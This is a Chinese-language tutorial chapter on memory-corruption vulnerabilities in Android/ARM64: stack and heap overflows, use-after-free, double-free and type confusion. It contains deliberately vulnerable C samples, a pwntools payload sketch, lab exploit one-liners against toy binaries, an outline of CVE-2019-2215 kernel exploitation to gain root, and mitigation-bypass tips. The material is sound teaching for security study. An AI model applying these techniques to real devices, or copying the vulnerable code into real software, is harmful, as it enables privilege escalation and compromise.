# 06 - 内存破坏

栈溢出、堆溢出、UAF、Double-Free、类型混淆。


## 概念速览

**内存破坏漏洞类型：**

| 类型 | 原因 | 后果 |
|------|------|------|
| 栈溢出 | 写入超过缓冲区 | 控制返回地址 |
| 堆溢出 | 写入超过分配大小 | 覆盖元数据/数据 |
| UAF | 释放后使用 | 控制对象内容 |
| Double-Free | 重复释放 | 堆破坏 |
| 类型混淆 | 错误类型转换 | 读写偏移错误 |

**Android 安全统计：**
- 70%+ 的高危漏洞是内存安全问题
- UAF 是最常见的 Android 内核漏洞


## 栈溢出

### ARM64 栈结构

```
高地址
┌────────────────────┐
│   Caller's frame   │
├────────────────────┤
│   Arguments (>8)   │
├────────────────────┤ ← 进入时的 SP
│   Saved LR (x30)   │  ← 攻击目标
├────────────────────┤
│   Saved FP (x29)   │
├────────────────────┤ ← FP 指向这里
│   Local variables  │
│   char buf[64]     │  ← 溢出源
├────────────────────┤ ← SP
低地址
```

### 漏洞代码

```c
void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);  // 无边界检查
}

// 内存布局
// buf:    [64 bytes]
// x29:    [8 bytes]  ← 被覆盖
// x30/LR: [8 bytes]  ← 被覆盖 → 控制执行流
```

### 利用步骤

```python
from pwn import *

# 1. 确定偏移
# cyclic 生成模式
payload = cyclic(200)
# 在 crash 时找到 PC 的值，计算偏移

# 2. 构造 payload
offset = 72  # buf(64) + x29(8)
payload = b"A" * offset
payload += p64(rop_gadget_1)  # 覆盖 LR
payload += p64(rop_gadget_2)
# ...
```

### 防护: Stack Canary

```c
// 编译器插入
void vulnerable(char *input) {
    unsigned long canary = __stack_chk_guard;
    char buf[64];
    strcpy(buf, input);
    if (canary != __stack_chk_guard) {
        __stack_chk_fail();  // 崩溃
    }
}
```

**绕过方式：**
- 信息泄露获取 canary
- 格式化字符串读取
- 覆盖时跳过 canary


## 堆溢出

### bionic libc 堆结构

```
┌──────────────────────────┐
│      Chunk Header        │
│  prev_size | size|flags  │
├──────────────────────────┤
│                          │
│      User Data           │
│                          │
├──────────────────────────┤
│      Next Chunk Header   │
└──────────────────────────┘
```

### 漏洞代码

```c
struct msg {
    int type;
    char data[100];
};

void process(char *input, size_t len) {
    struct msg *m = malloc(sizeof(struct msg));
    memcpy(m->data, input, len);  // len > 100 时溢出
}
```

### 利用方式

```
1. 溢出覆盖相邻 chunk 的元数据
2. 修改 size 字段 → 造成重叠
3. 覆盖函数指针 → 控制执行流

或者:
1. 溢出覆盖相邻对象的数据
2. 如果相邻对象有函数指针 → 直接控制
```

### Heap Feng Shui

```c
// 控制堆布局
void *a = malloc(0x100);  // 分配 A
void *b = malloc(0x100);  // 分配 B (相邻)
free(a);                  // 释放 A
void *c = malloc(0x100);  // C 占据 A 的位置

// 现在 C 和 B 相邻
// 溢出 C 可以覆盖 B
```


## Use-After-Free (UAF)

### 原理

```
1. 分配对象 A
2. 释放对象 A
3. 分配对象 B (复用 A 的内存)
4. 通过悬垂指针访问 A → 实际访问 B

如果 A 和 B 结构不同，可能:
- 将 B 的数据解释为 A 的函数指针
- 将 A 的指针解释为 B 的数据
```

### 漏洞代码

```c
struct victim {
    void (*callback)(void);
    char data[56];
};

struct attacker {
    char buf[64];
};

struct victim *v = malloc(sizeof(struct victim));
v->callback = safe_func;

// 漏洞触发
free(v);  // v 被释放，但指针仍存在

// 攻击者分配
struct attacker *a = malloc(sizeof(struct attacker));
memset(a->buf, 0x41, 64);  // 填充数据

// UAF 触发
v->callback();  // 调用 0x4141414141414141
```

### Android Binder UAF 模式

```c
// 典型模式 (简化)
struct binder_thread {
    struct list_head entry;
    void (*death_callback)(void);
    // ...
};

// 正常流程
thread = create_binder_thread();
register_callback(thread, func);

// 漏洞: 竞态条件
// Thread 1: free(thread);
// Thread 2: thread->death_callback();  // UAF!
```

### CVE-2019-2215 分析

```
漏洞位置: drivers/android/binder.c
漏洞类型: UAF (binder_thread)

触发:
1. 创建 binder 文件描述符
2. 用 epoll 监控
3. 关闭 fd，触发 binder_release
4. epoll 仍持有引用 → UAF

利用:
1. 释放 binder_thread
2. 堆喷射覆盖 → 控制函数指针
3. 触发回调 → ROP chain
4. commit_creds(prepare_kernel_cred(0))
5. Root!
```


## Double-Free

### 原理

```c
void *p = malloc(100);
free(p);
free(p);  // Double-free!

// 后果:
// 1. p 被加入 freelist 两次
// 2. 两次 malloc 可能返回相同地址
// 3. 两个指针指向同一内存 → 混淆
```

### 利用

```c
void *a = malloc(100);
free(a);
free(a);  // Double-free

void *b = malloc(100);  // 返回 a 的地址
void *c = malloc(100);  // 也返回 a 的地址！

// 现在 b == c
// 修改 b 会影响 c
// 如果 c 包含函数指针，可被控制
```


## 类型混淆

### 原理

```c
struct typeA {
    int flags;
    void (*func)(void);
};

struct typeB {
    char data[8];
    int value;
};

void *obj = create_object(TYPE_A);

// 漏洞：类型检查不正确
struct typeB *b = (struct typeB *)obj;
// b->data 实际是 A 的 flags + func 指针的一部分
// 写入 b->data 可能破坏 func 指针
```

### Android 场景

```c
// Binder 对象类型混淆
// 对象可能是 BINDER、HANDLE 或 WEAK_HANDLE

union binder_object {
    struct flat_binder_object flat;
    struct binder_fd_object fd;
    // ...
};

// 如果类型判断错误，字段解释错误
```


## 实战场景

### Lab 1: 栈溢出利用

**目标：** 编写并利用简单栈溢出

```c
// stack_vuln.c
#include <stdio.h>
#include <string.h>

void win() {
    printf("You win!\n");
    // system("/bin/sh");
}

void vuln(char *input) {
    char buf[64];
    printf("buf at: %p\n", buf);
    strcpy(buf, input);
}

int main(int argc, char **argv) {
    if (argc > 1) vuln(argv[1]);
    return 0;
}
```

```bash
# 编译 (禁用保护以便学习)
aarch64-linux-gnu-gcc -fno-stack-protector -no-pie \
    -o stack_vuln stack_vuln.c

# 找到 win 地址
aarch64-linux-gnu-objdump -d stack_vuln | grep win
# 0x0000000000400544 <win>:

# 利用
python3 -c "print('A'*72 + '\x44\x05\x40\x00\x00\x00\x00\x00')" | \
    qemu-aarch64 ./stack_vuln
```

### Lab 2: UAF 模拟

**目标：** 理解 UAF 利用

```c
// uaf_demo.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct safe_obj {
    void (*print)(const char *);
    char msg[56];
};

struct evil_obj {
    char data[64];
};

void safe_print(const char *s) { printf("Safe: %s\n", s); }

int main() {
    struct safe_obj *p = malloc(sizeof(struct safe_obj));
    p->print = safe_print;
    strcpy(p->msg, "Hello");
    
    printf("Before free: ");
    p->print(p->msg);
    
    free(p);  // 释放
    
    // 分配新对象占据相同内存
    struct evil_obj *e = malloc(sizeof(struct evil_obj));
    memset(e->data, 'A', 8);  // 覆盖函数指针
    
    printf("After UAF: ");
    // 危险! p->print 现在是 0x4141414141414141
    // p->print(p->msg);  // 会崩溃或执行任意代码
    
    printf("ptr would be: %p\n", p->print);
    return 0;
}
```

### Lab 3: CVE 分析

**目标：** 分析真实 Android CVE

```
CVE-2020-0041: Binder 竞态 UAF

位置: drivers/android/binder.c

漏洞:
1. binder_free_thread() 和 binder_get_thread() 竞态
2. thread 被释放后仍可访问

补丁分析:
- 添加适当的锁
- 引用计数正确性

影响:
- 内核代码执行
- 权限提升
```


## 防护机制

### DEP / NX / W^X

```
内存页属性:
RW-: 可读写，不可执行 (数据段、堆、栈)
R-X: 可读执行，不可写 (代码段)

绕过: ROP，不需要注入代码
```

### ASLR

```
每次运行地址不同:
0x7fff12345678 (这次)
0x7fff87654321 (下次)

绕过: 信息泄露获取地址
```

### Stack Canary

```
栈上放置随机值，返回前检查

绕过:
- 泄露 canary 值
- 覆盖时跳过 canary
- 格式化字符串读取
```

### KASAN

```
内核地址消毒器
检测:
- 越界访问
- UAF
- Double-free

只在调试编译启用
```


## 常见陷阱

### ❌ 陷阱 1: 堆布局不稳定

```c
// 堆分配顺序不确定
void *a = malloc(100);
void *b = malloc(100);
// a 和 b 不一定相邻

// 解决: Heap Feng Shui
// 多次分配/释放控制布局
```

### ❌ 陷阱 2: 时序问题

```c
// 竞态条件难以稳定触发
// Thread 1: free(obj);
// Thread 2: use(obj);

// 解决:
// - 增加竞态窗口 (sleep, usleep)
// - CPU affinity
// - 多次尝试
```

### ❌ 陷阱 3: 内存重用失败

```c
// UAF 时，目标对象可能不复用原内存

// 解决:
// - 相同大小分配
// - 大量喷射
// - 理解 allocator 行为
```


## 深入阅读

**推荐资源：**
- [Phrack - Once upon a free()](http://phrack.org/issues/57/9.html)
- [Project Zero Blog](https://googleprojectzero.blogspot.com/)
- [Android Security Bulletins](https://source.android.com/docs/security/bulletin)

**相关章节：**
- [05 - 控制流劫持](./05-control-flow-hijack.md) - 利用内存破坏
- [07 - Exploit 开发](./07-exploit-development.md) - 完整利用


## 下一步

[07 - Exploit 开发](./07-exploit-development.md) — 完整 exploit 开发流程
